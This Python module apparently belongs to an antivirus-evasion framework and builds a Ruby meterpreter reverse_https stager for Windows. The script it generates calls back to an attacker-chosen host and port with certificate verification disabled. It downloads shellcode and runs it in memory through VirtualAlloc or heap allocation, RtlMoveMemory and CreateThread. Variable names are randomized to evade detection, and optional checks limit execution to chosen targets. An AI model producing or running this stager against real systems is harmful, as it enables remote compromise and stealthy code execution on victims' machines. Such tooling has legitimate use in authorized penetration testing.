"""

Custom-written pure ruby meterpreter/reverse_https stager.

TODO: better randomization

Module built by @harmj0y
Updated by @ChrisTruncer

"""

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"
        self.name = "Pure Ruby Reverse HTTPS Stager"
        self.path = "ruby/meterpreter/rev_https"
        self.cli_opts = cli_obj
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "The listen target address"],
            "LPORT"          : ["4444", "The listen port"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "HOSTNAME"       : ["X", "Optional: Only run on specified hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):
        payload_code = ''

        payload_code = "require 'rubygems';require 'uri';require 'win32/api';require 'net/https';require 'openssl';include Win32\n"
        # Add logic for adding this line, stupid bug and I have no idea
        # why this is even a problem, but ruby is dumb
        if self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X" or self.required_options["SLEEP"][0] != "X":
            pass
        else:
            payload_code += "exit if Object.const_defined?(:Ocra)\n"

        if self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X":
            payload_code += 'require \'socket\'\n'

        payload_code2, num_ends_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2

        # randomly generate out variable names
        ptrName = evasion_helpers.randomString()
        threadName = evasion_helpers.randomString()
        heap_name = evasion_helpers.randomString()
        valloc_random = evasion_helpers.randomString()
        rtlmove_random = evasion_helpers.randomString()
        createthread_random = evasion_helpers.randomString()
        waitfor_random = evasion_helpers.randomString()
        heapcreate_random = evasion_helpers.randomString()
        heapalloc_random = evasion_helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "$" + valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');$" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');$" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');$" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "$" + heapcreate_random + " = API.new('HeapCreate', 'III', 'I');$" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');$" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');$" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');$" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"

        payload_code += "def ch()\n"
        #payload_code += "\tchk = (\"a\"..\"z\").to_a + (\"A\"..\"Z\").to_a + (\"0\"..\"9\").to_a\n"
        #payload_code += "\t32.times do\n"
        #payload_code += "\t\turi = chk.sample(3).join()\n"
        #payload_code += "\t\tchk.sort_by {rand}.each do |x|\n"
        #payload_code += "\t\t\treturn(uri + x) if (uri + x).unpack(\"C*\").inject(:+) % 0x100 == 92\n"
        #payload_code += "\t\tend\n"
        #payload_code += "\tend\n"
        payload_code += "\treturn \"WEZf\"\n"
        payload_code += "end\n"

        payload_code += "def ij(sc)\n"
        payload_code += "\tif sc.length > 1000\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "\t\tpt = $" + valloc_random + ".call(0,(sc.length > 0x1000 ? sc.length : 0x1000), 0x1000, 0x40)\n"
            payload_code += "\t\tx = $" + rtlmove_random + ".call(pt,sc,sc.length)\n"
            payload_code += "\t\tx = $" + waitfor_random + ".call($" + createthread_random + ".call(0,0,pt,0,0,0),0xFFFFFFF)\n"
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += "\t\t$" + heap_name + " = $" + heapcreate_random + ".call(0x0004,(sc.length > 0x1000 ? sc.length : 0x1000), 0)\n"
            payload_code += "\t\t$" + ptrName + " = $" + heapalloc_random + ".call($" + heap_name + ", 0x00000008, sc.length)\n"
            payload_code += "\t\tx = $" + rtlmove_random + ".call($" + ptrName + ",sc,sc.length)\n"
            payload_code += "\t\tx = $" + waitfor_random + ".call($" + createthread_random + ".call(0,0,$" + ptrName + ",0,0,0),0xFFFFFFF)\n"

        payload_code += "\tend\nend\n"

        payload_code += "uri = URI.parse(\"https://%s:%s/#{ch()}\")\n" % (self.required_options["LHOST"][0], self.required_options["LPORT"][0])
        payload_code += "http = Net::HTTP.new(uri.host, uri.port)\n"
        payload_code += "http.use_ssl = true\n"
        payload_code += "http.verify_mode = OpenSSL::SSL::VERIFY_NONE\n"
        payload_code += "request = Net::HTTP::Get.new(uri.request_uri)\n"
        payload_code += "response = http.request(request)\n"
        payload_code += "ij(response.body)\n"

        # Close out all the if statements
        for iteration in range(num_ends_required):
            payload_code += 'end\n'

        self.payload_source_code = payload_code
        return
        